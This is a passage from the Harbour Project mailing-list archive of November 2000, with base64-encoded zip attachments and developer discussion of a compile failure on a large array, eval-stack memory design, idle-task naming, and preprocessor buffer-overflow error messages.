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
UEsFBgAAAAAEAAQA2gAAAIrIAgAAAA==

------=_NextPart_000_001D_01C057E3.03A03E80--


From harbour@lists.harbour-project.org  Sun Nov 26 17:32:16 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Sun Nov 26 17:32:16 2000
Subject: [Harbour] Big array won't compile
In-Reply-To: <002601c057f5$09990080$0100007f@sl.conex.net>
Message-ID: <NCBBJKNMIDPJNLJCHCHIKEJPFJAA.harbour@winfakt.com>

This is a multi-part message in MIME format.

------=_NextPart_000_000A_01C05800.F6FBDF40
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Hi,

Attached "Test.prg" does not compile with latest Harbour.

regards,

Patrick Mast
www.Patrick.Be.kz
------=_NextPart_000_000A_01C05800.F6FBDF40
Content-Type: application/x-zip-compressed;
	name="Test.zip"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
	filename="Test.zip"

UEsDBBQAAgAIAGS7eind1/NbXhAAAEtvAAAIAAAAVGVzdC5wcmfVHUvLJEnxPjD/oY4r9KHynaWI
iLggjCss+gMW2cOAjBc9if/diox8V0RmVvUo4wfN191VGRnviIyMyv7+n1/++o/Pf/+y/fGnz1++
+8XHDx8/fPrT7377afvp+89/+3nbfvnrfwnpX5tQr23bz//iJXZ5vsz58udLvDazv4Q4vxP6/Hze
dxyvTVv8f44Ryr5+9fHD1v8JvJxfwrw2a08wIoI6pz3c+f4EsZ/XlTyvuxO0wtf5mQJrFM5uVJ59
k2UaCWAmlBBgSeKkegl/YihPkFqU6ZSppjvv0ef7k4kUWAng4LJDkAaIBqx0JB7++8iU9DlifTIG
xlBggSC4fd+RsAzS56H43wZqwrWMvQ3vKd5GggKx6gRvZcTeL2NPge0IGmJ/iifcE8QXr2tLM+FK
VKHgJFqfIpV2SAGjCTORjCmwPFgXhwtCLK6hQML0gLmJyicPmrfPlKqmgORtT5QJWANxCFJmM2mp
KJZIgA2igctAmFVRNLIRDfgI/Kzw9cwctiPZPfw/CH7Lht+MObSY6luYwvSkJvSKU7BMRgv85gx3
xNvwOsV0mNuGC9dJ3q6qPa0hcJ3hLbruozXcC88Fy3MuOiwZK1ohpRkUWLVPsJzr8APeZh0WIgem
Xoc5vWUxXdNhUm9H/KywBAVLEffb5q1I1qa/Zd5WWJbgrtZ4K1/vYvzEJ0RfUFxNjBIVxhRYwi3f
xfhp+pF4HL5DfwxebcWDvYHxGx4M9Xe/5rgryZKYYKxIjDlsV31uw2OD/uKbxTbzVyRv5r91bOPn
oBExf5hiqybYmv8eb2ttwGsktnKaus0sjsJ2IXUb6e9g7UC55n7FKNWB33sTk/uyPGQ92LPkPmHP
aUJYMV4VZ7i4sj5klsLTQedB4vkobU6gPKZzoUThGredKYi1iNGat1/s36iEcOuyNPt2tTIBoGT6
3gST2PyJsT3HeR/ek9hqLJK4A8VgjxZE+C6BAqXTl+9IsBZvcyeRXiJ40E2/I4gDazebV/gCiprP
jk4/ovLkW0+wzsUhtlDQX9/8K43ljBeIgdsBw8AzCmR1TwUSrlFgXeQTYMCBrO/pQALjSLAAKhIN
YEDNu2H5Hndec+d9zkbR2sB7EqxCbOC/jyLa4uf6+4tGgPJJVmRwGWbOHgviWfG3aWi6T0KFaYuK
tpmRlfVDS3Ew8jJPoZHw8Nm+pDFB4ag1b7gkL5iBAQvwA8HyIs8JCuA+Um/jUMhQhGSHBt7C9FA9
Fbq5j2RCNbSuig6wK/fZcN9gSdIMdarwEJyiqPib/DOIFjDnFCzFe4N6Cf4AFCv4gmTIe7GyRE24
X7JWRoFLPgHcT9bfHc0igJXPwPbWdMWwHsf5hB5DHy3LJdeyZz7eBrsXMIGnUUxCs+DSWBJscoay
cityimFBh+ZtkLCMvHS5vD4Flxjl+aX0ElZ7cZ6BSSaLktWECTgIoUBRAFlF3sj7d8CCsrmjYFyJ
866Vhc+u8L7BsjCOzW85kBXh1pMWNlKwRsJ7AePskmZwvLVRYawrDm/G80rX2cgrS2rhY74F20Vh
wYQZJC5HMIsEikJ6F4tZTG0c1wKIsZCxjpjy2h2robWY+qlIsKjeQqYc94gpssXPyX1byB+OKjrH
73dmG87lVLh+yWoRlUGE0rEN0VgkrLdh0MGZNYprE7fAs3mCw7IvgJExEoPqn5FWWI25grchroXr
EN/idUlvw4UaYg0C1lsBhC88DRmMbrMdWH2Os5qSqVSBuiO8YQIo1mZGlfzRcBqka0B+BbACFv4d
yDfBCrWTIN8AK0KeZtjrD8DCpuEI5AOwwogpyJtgg4ksgLwBVlixDHIRrLDuFsgVV+PMbZATsMLL
RyBHK52QDj8DydXGD/MWSLkz2L4DEk3lK3iw4jzTskWw9YRYykHXLLAYGFIPie0ODgsu5b2u3huu
soSXbXWrwxV6DEQYCiEqQyoi4uIposAEndBFYXEDK4OQAUTAHnysN2W3BGplgZo9V524rXmzl0wl
1xtFyR1CLw2W02pw4Zqlk6VIDKQRgXgZl9aBAlNRoGgmWDpthgCtExhbgdGFESDxHstMAa0JG66+
w3DIrqFTRclYscdd6PA5lDRTrTE2GmnLVu10LPcMmXFUVJgLMzhso15uVZcEgrAIItYZAuaQCwPj
IFWJmwqcq+l5KWIKnTqreoaE9zJu1e/spmFkfcNnKKREPmO5/Yipss5NXUGHref3HVzENKZx+X3L
hKxUWbkQBY63qRYzElsqvIbpjkpsivYJFuuwobwjUXTRnSA4zYLDzVpawUKnmioFwJw+740iIb9x
xxSLLBJrDzRvM59qzxUbiqZK5ne20Kp8haFoiERKoodTB23YzAp9oJ+46tHV9rG9+AMuOmR/oAi+
/d/qra4CkJCVDBy7X6Zkqb2k6oaLfiEFmOgQkd82b8iOfIKLYtsdiqR32ToGHJuaEHXcSVFs6TIo
USJUsoSiOcgMqh5HunE1BiV8qdMAUyzWvlIE4YoqVbdq2RICxQHiPYndpnWDCgn2BnZJvN2LE9kU
OzNkFOlqzIR3NgcXSE0AdDDuiArbTXG1MMRERz+skBLGwjifIFRzS2BA2L6smWDvM+FgmUDmXElU
SR6K3kMHP0qKyS2bxtTK/ASUJyngrCwS005xlLJEzLpxClNECuGT7mgVqegPoExdYVJtADpk2fuB
qarQSvYnxOJUj8kWwyBsJYUp5T1/q2N5N+kuEylEnSnKor+eDuhh90lebg3pRdJl7XNqUlZDxzTo
zEwi9HzEFMXoCzNID5YU6DkzOGyT7d9gxiw6GFNpgsWWnLj8Q6Jtex2mkrZoCtMtHIZODFVEESUj
7yyNW+7Fko+IKR1WRfem6olVUVykYlXU5uvUzincAn0y3pYhSrYgIaB7W33200Ir8M7jSkemFUwN
Eqr5HtNomZLP+jpjDh7ZH245bDMk8Nqj+MJn0VIBa+KN6VTZXLylJQxbc7BQHT7rloqw0xquHxxv
Q0W5HmJT0RrFJ1xHhY9UCMHxVhwtYVDSwSHpc0tF2JoP11EWUmp2dy8NUZEwgeKRuqVC6kQFyOLI
SkjyVsZb0hCbS+1S9o0F+kVFE9bKfBdgbJsy27119dnATTBkcqvIYJ9BGC7XVj32fmrH5LC5MeNG
ki91zlVHiWm417rLoopzNWQSrzBgQxpyKQrIeE3wCyj5Wgo8qSGGYARjvMgIV+2jy5Imh7z3KF7N
HZcklenEbvLWZjEVt+pDKicYUbphrYaKChBlu4Q+fO9d1fQ9FNlQEzT2jCFFGkWcDJ3pY9x9uS0y
IPfWeVU1zTM1Rq35Zk6NvNNVWqxFeZE8LUkrV/2g8ljnm366zNfFVaQ9JsHcFevaU0+jedUy4Xb8
STExxLv9Xg42cDNO3F/pVA0DIUaZWFRJxWpfemyaqeRYZKKZvfGrTjH+t72PceN0qX2xfMH1g/GF
qfToau5gDff2TlKz1eauuNcyIrZCBCpiaajraSJzsL0Fu+18wxbTecV1U4QhRFfVrD0q+mcy/eha
n0Y9TClp6pqRSLCl9yiDpZqIBt1A3MbWqNNn1LITe284V1O341B9NX2DTMckkglE88tlkxZ28uLC
aav7ROR0Q1bbkr5t8qtsyE66JzbxYGteEGDqacQEWznt/XjIiBFv+6fnLxR4liIWrLgQ1jJC3sZW
yrZLuOsCuoLU3ZTq/vaxfDW8T4xIDcsC1xpD3moGtBjzWvGb3cK3hLF6Kpd52xMmO71lTUUtN2lc
pug0Qrh1vdVT3uEUnQZUejzVBLM4hZ2aA2tddnEKZhuuGi45/XXDKcj0I86qOqlLznP5dX/bEaY6
DZCcTziWm4suU3QaINU6tvuaeJTtptDr2IrFKYrBc2Alp69yaQru0aqGMDvoo6Gn4LBNhOleAzh9
1euxrOOd7jXAs8F+NTpcpug14FjHdtEH6M7lq/UWPuHWpjD7NJYpsZYfXKjjH2rmsFOTzGZkDrr0
HZCg1RQ0ywQ9BqH07axG1OncCLR5nt/OQNv7GWMHmtMA5W43c3ageTH6262nF4YwSqaO242yF4Yw
eq3vt/WuilGL2/ntohjJ6LBmoAVrvawJWt0Dvfm1JcmeOySegJ7xVptHDFkRmbb3QE/ceAPa3QI9
OfejBe2XQbN5Agf6eDc6hMSIWpmb/e3oAFk35bWMeDs6hEIrBVq+HR0uDEmg1fvRQTCg9bvRgQd9
/xGVvr4wXU7b6brMrBquaJbTbJIf+z+tjZ1ADpXKpG2i7rhC6BCIgUgODu1JO/kqVTzLZ1Hv88JB
EtVWc6rosdFBdctoyST1/lJLWA6RvfQ1LcJqKhbsJOhsajjVEFvfSVmUGgNZnlA5PZmaw8R9x/aH
/H+w8M8McEt1mVaHRbiP1VvfFVV09Ty6/ZoPK13F01uanxZaRVV2aBgx1tclx7iv6WuFZRrHYiuZ
9W3Pa03y+qs8UGPWQ+SVMFLp/N4VuS2bJ7BrLruEvdR0z5IWeVZ+Cndfb3WetZmCC+w3ymvdkMsU
XZr8pLzWV5UYMeE0a/mt2JfFVFMzi7wrZbbOClc0geOhuL+dwYmJy2iEup8syVuea5iIutuR9u4G
Qb0bdWOqAW+nQV3y+QPTZnY3GjSV59m67D5PV3krzSPxDfMEjtC5prCx7C5Pj/nC/zlPZ7xV4i2T
uONvlVqeahp5JzxVtKawm91vmIRyczf+THwrvFXH/2ztoMXjtcNdnmo1L1i9ZxLD8pp5bBJ3E1G9
FpBIBVvlqSzVpmYhIMdtD7LKbzvD7Wu37/hbWeozDSPW1w5GMkO7hWpfhhNy7hNkqXk1vLvmuaGm
4GTOIEeaIC19ks7BH48DrVFMe2T+2QLqAK++sw2KLeJ6RhDZCjU4F+zSMGfI3yHgHlurZ69PMbQ2
PvXSYRgeBYgdb15xxzIEnlrTNB3mh2ycy8eXA7/z0ZpbPHidBkuKIg2pHwr1e2nx3fA0+nAuJnd8
k8sHquMTsbHdLPEvPm8+mor7xYQ0BDoppYhDKqUK4O4dkka1QsJUw5O42jZJ7ki31IYO64XZwV61
Asbpbx3kNei47JiycpAXdRAd+IWvdADdREx1Yyd71qXDhenigXNPmdD3iE40g2UCc8DchKdpLAm2
azddAdW1onLmMBUPcWpcpeOr5zH2Xa0TcZLYVk2wYv10uPooODI6RL6KY+lUOOoIOO5It/5UOCHp
KZij39hHAqNb3tE147AYOrd0GnL60YDU6R6ffzgMe+RF8LdHObE/n9mcQNtwPf8OQYzUeI05t/ko
pwzIKhrUIMMxLTI/QlGuaf603gOl6sptKMbUcR01xdXSj0c2eMNqwuV2XRq9nc/5ASpa/z0+0Hjn
mMegx4NoEY7KMCzY3OF+dCBkfCbdF2uzRJwbmEPKYBKPk9XVUaLPfqzLU3Pt6JchpmxweTlNmLhW
/5U8zO/sPVzkvWDbpm4k2AVse4n3YJOzzExxMQfDrIf0t9fDJ0MSL9qKcjnZcP00s+qwOXzSuOxP
4pF5R7eIEk2jwbRJw5Mt01JpYjMRvjf8+WB6uVFLhIaiZhH1b/h1vN9sn37+8l34dbzwa3k//v7P
f/nxh+2HP3z6D1BLAQIUABQAAgAIAGS7eind1/NbXhAAAEtvAAAIAAAAAAAAAAAAIAAAAAAAAABU
ZXN0LnByZ1BLBQYAAAAAAQABADYAAACEEAAAAAA=

------=_NextPart_000_000A_01C05800.F6FBDF40--


From harbour@lists.harbour-project.org  Sun Nov 26 17:39:01 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sun Nov 26 17:39:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011261737_MC2-BC20-1F01@compuserve.com>

Ryszard,

"With adding a simple progress bar with HB_IDLESTATE() call you have a
reliable solution for data processing."

No, you have an ugly kludge.

Workable it may be.  Pretty it ain't!  It's neither necessary nor
desirable.

Please let's put in a proper mechanism which isn't ugly. :-)

John.

From harbour@lists.harbour-project.org  Sun Nov 26 17:39:42 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sun Nov 26 17:39:42 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011261737_MC2-BC20-1F02@compuserve.com>

Ryszard,

"We will have to use different code for different OS instead of =

simple ANSI C code."

That's misleading at best, wrong at worst.

The "simple ANSI C" (not that it appears to have much to do with ANSI!)
currently has severe problems, e.g. moving the stack and thus breaking
perfectly reasonable code.  Ideas such as using a linked list will be
slower and use more space.  However, if that's acceptable on some
systems then use it.  But I don't see any sense on using such a poor
stack mechanism on higher-end platforms which have facilities (virtual
alloc/commit) which can be used to advantage.

John.

From harbour@lists.harbour-project.org  Sun Nov 26 17:40:25 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sun Nov 26 17:40:25 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011261738_MC2-BC20-1F03@compuserve.com>

Ryszard,

> It will simply mean that a reasonable Stack Size will be used in DOS.

"In DOS box Clipper can use all available memory if  compiled with
any protected mode linker."

But not for the stack. :-(

"Harbour can use this memory too."

Yes.

"Why do you want to limit usage of harbour in DOS?"

I don't see why Harbour-with-DOS-Extender should have any particular
limits.  It depends on how its stack management is done.  If the
DOS Extender makes it hard to have a stack done the same way other
systems allow, so be it.  Something tuned to the Extender's limitations
can be done, if anyone cares enough to tune it specially.

The main thing is that it is important to provide clean and fast
stack access and management, which does not appear possible using
most (all?) of the other techniques so far suggested.  In effect,
those techniques would impose a slow and/or bloated and/or awkward
stack on _all_ platforms.  I don't see that as better than what's now
suggested, which is especially good on higher-end platforms at the
same time as being pretty good on the other platforms.

If you've an even better idea, please explain. :-)

John.

From harbour@lists.harbour-project.org  Sun Nov 26 17:41:07 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sun Nov 26 17:41:07 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011261738_MC2-BC20-1F04@compuserve.com>

Ryszard,

As far as I can see, the idea (Ron's?) [1] already suggested is far
better than any other way so far suggested of handling the stack.  So,
let's do it that way. :-)

[1] of allocating virtual space and committing it as needed, on those
systems able to do that, and something simpler on systems lacking that
ability.

John.

From harbour@lists.harbour-project.org  Sun Nov 26 17:41:44 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sun Nov 26 17:41:44 2000
Subject: [Harbour] detached forwardly-declared locals
Message-ID: <200011261738_MC2-BC20-1F07@compuserve.com>

Brian,

I think it works in Clipper because in effect it moves all the assigns
down to the point after all the LOCALs (when considered without their
assigns <g>).

BTW, I'm not sure why you used the Subject you did.

John.

From harbour@lists.harbour-project.org  Sun Nov 26 17:42:24 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sun Nov 26 17:42:24 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011261738_MC2-BC20-1F05@compuserve.com>

Ryszard,

"This was the state of idle code before Ron's changes"

Temporarily ignoring who made what change, all I'm asking is that
we stop using a complete misnomer (=3D wrong name).  They're not "idle
tasks".

"A compiler should give the maximum of freedom in code developing for =

future user instead of forcing unneeded requirements."

Maybe.

"So this is a discussion about our method of harbour developing"

Not as far as I'm concerned right now.  I "just" want us to call a
task what it is, rather than be misleading.

Perhaps the thing to do would be to call them low-priority actions,
and to say these are not guaranteed ever to run but if they do it is
during wait states.

Personally I think they should not exist, because we should have a
proper way to provide what appears to be a needed facility.  But
however the facility is provided "idle" is what these things are _not_,
so let's not call them "idle".

"However I would call it 'events' and I would prefer to =

introduce a different kinds of events ..."

May be useful.  They would also _not_ be referred to as "idle" tasks.
:-)

John.

From harbour@lists.harbour-project.org  Sun Nov 26 20:16:03 2000
From: harbour@lists.harbour-project.org (April)
Date: Sun Nov 26 20:16:03 2000
Subject: [Harbour] using params already on stack (setkey / F1 help bug)
Message-ID: <3A213F6F.26C68216@user.rose.com>

A bug reported is that the default setkey for F1 does not pass the
proc/line/var params to the function; I believe it is caused by the
rtl\xhelp.c api which locates a dynamic symbol, and if it finds it,
calls it.

   PHB_DYNS pDynSym = hb_dynsymFind( "HELP" );
   if( pDynSym )
   {
      hb_vmPushSymbol( pDynSym->pSymbol );
      hb_vmPushNil();
      hb_vmDo( 0 );
      /* NOTE: Leave the return value as it is. */
   }

questions:

1. won't the above code change the stack depth?  wouldn't the callstack
be
different if the programmer set's the F1 key directly (ie. harbinit
executes
"set key F1 to __xhelp" which in turn calls help() vs programmer
executing
"set key F1 to help")

2. do I have to retrieve all of the params then push them onto the stack

then call the prg, or can I tell vmDo() how many parms are on the stack
already and it can use them?

3. Would the nil param pushed cause a problem or is it swallowed by
vmDo()?

April



From harbour@lists.harbour-project.org  Sun Nov 26 20:16:38 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sun Nov 26 20:16:38 2000
Subject: [Harbour] simplex problem
In-Reply-To: <002601c057f5$09990080$0100007f@sl.conex.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEINDHAA.ron@profit-master.com>

Luiz,

Can you please explain what the problem is?

I was able to compile your code without any problem, and it produced the
exact same .C output as Flex build.

Ron

> Ron
>
> The follow code dont work with simplex
>
> function GetBccDir()
> local cPath:=''
> Local cEnv:=Gete("PATH")
> local aEnv:=listasarray2(cEnv,";")
> local nPos
>
> for nPos:=1 to len(aEnv)
>     if file(aenv[nPos]+'\bcc32.exe')
>         cPath:=aenv[nPos]
>         exit
>     endif
> next
>
> return cPath
>
> Regards from Brazil
>
> Luiz Rafael Culik


From harbour@lists.harbour-project.org  Sun Nov 26 21:38:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sun Nov 26 21:38:02 2000
Subject: [Harbour] Big array won't compile
In-Reply-To: <NCBBJKNMIDPJNLJCHCHIKEJPFJAA.harbour@winfakt.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEINDHAA.ron@profit-master.com>

Patrick,

"with latest harbour" - Did it compile before???

This appears to be some buffer/stack overflow in Bison, and can't be
compiled by Clipper either.

It seems this line is just too long. I've changed SimpLex NUMERALS_PER_LINE
to just below the point where the parser fails, so that the user can at
least get a reasonable error "Error SLX0002 Too many numerals in line <X>".
I'll search to see if we can catch this condition in Bison and how?

Simple fix might be to split it into 2 lines and later consolidate the 2
arrays.

Ron

> Hi,
>
> Attached "Test.prg" does not compile with latest Harbour.
>
> regards,
>
> Patrick Mast
> www.Patrick.Be.kz


From harbour@lists.harbour-project.org  Sun Nov 26 21:41:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sun Nov 26 21:41:01 2000
Subject: [Harbour] 2000-11-26 18:40 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEINDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEIODHAA.ron@profit-master.com>

2000-11-26 18:40 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/compiler/harbour.slx
     + Added Error message if NUMERALS_PER_LINE is exhausted, and set it to
3000 (just below apparent parser limitation)


From harbour@lists.harbour-project.org  Sun Nov 26 22:23:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sun Nov 26 22:23:02 2000
Subject: [Harbour] Big array won't compile
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOEINDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKEIODHAA.ron@profit-master.com>

Patrick,

> This appears to be some buffer/stack overflow in Bison, and can't be
> compiled by Clipper either.

Actually, it is a PP buffer overflow! I'll try to add an Error Message.

Ron

From harbour@lists.harbour-project.org  Sun Nov 26 23:13:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Sun Nov 26 23:13:02 2000
Subject: [Harbour] detached forwardly-declared locals
References: <200011261738_MC2-BC20-1F07@compuserve.com>
Message-ID: <001501c05828$35338980$8604d2cc@san.rr.com>

John:
>>BTW, I'm not sure why you used the Subject you did.
At first I thought the problem was related to a hard-coded block (with a
reference to a local) being passed along inside another codeblock before it
was "detached".

Brian Hays
Abacus Data Systems, Inc




From harbour@lists.harbour-project.org  Mon Nov 27 00:16:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 00:16:03 2000
Subject: [Harbour] 2000-11-26 21:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <001501c05828$35338980$8604d2cc@san.rr.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEIPDHAA.ron@profit-master.com>

2000-11-26 21:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * include/hberrors.h
   * source/pp/ppcomp.c
   * source/pp/ppcore.c
     + Added error support for Input buffer overflow .

From harbour@lists.harbour-project.org  Mon Nov 27 04:26:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Mon Nov 27 04:26:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random  gpfs)
In-Reply-To: <200011261737_MC2-BC20-1F02@compuserve.com>
Message-ID: <3A223617.7428.3CFDF86@localhost>

On 26 Nov 2000, at 17:37, John Skelton wrote:

> "We will have to use different code for different OS instead of 
> simple ANSI C code."
> 
> That's misleading at best, wrong at worst.

  Sorry, I was reffering to standard ANSI C functions malloc-calloc-
free. These are functions implemented in every ANSI C compatible 
compiler.
  Functions for managing virtual memory are non-standard and OS-
specific. This means that they are fragile for any changes made by a 
supplier of these functions. Additionally, these functions are not 
tested widely - who can guarantee that they will work as documented?
Who will test if it works correctly? Who will look for bugs inside 
such functions?

> The "simple ANSI C" (not that it appears to have much to do with
> ANSI!) currently has severe problems, e.g. moving the stack and thus
> breaking perfectly reasonable code.  Ideas such as using a linked list
> will be slower and use more space.  However, if that's acceptable on
> some systems then use it.  But I don't see any sense on using such a
> poor stack mechanism on higher-end platforms which have facilities
> (virtual alloc/commit) which can be used to advantage.

  Yes, OS specific solution can give better performance however at 
the cost of decreased stability. If this cost is acceptable for 
someone that it is OK. We can deliver such solution.
  But we need the vialable solution that will work on all suported 
platforms too. The linked list of blocks is the only such solution. 
  Then it is clear that stack handling code have to be removed from 
VM code into a separate file. Any code that access stack have to use 
either a function call or some macro. Also hb_param() have to be 
moved from EXTEND API into this new stack module. This way we will 
have a base for different stack implementations. 

Regards, Ryszard

From harbour@lists.harbour-project.org  Mon Nov 27 05:26:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Mon Nov 27 05:26:02 2000
Subject: [Harbour] Harbour make Utility
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKAEIFDHAA.ron@profit-master.com>; from ron@profit-master.com on Sat, Nov 25, 2000 at 04:45:42PM -0800
References: <000b01c05740$e9b8cde0$0100007f@sl.conex.net> <LOBBKAFMMFGJIKLMEPAKAEIFDHAA.ron@profit-master.com>
Message-ID: <20001127095302.O26952@hagbard.davep.org>

On Sat, Nov 25, 2000 at 04:45:42PM -0800, Ron Pinkas wrote:

> You can get the executable path, by looking at the command line argument.

Note that this isn't considered to be a portable method.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Mon Nov 27 05:26:43 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Mon Nov 27 05:26:43 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
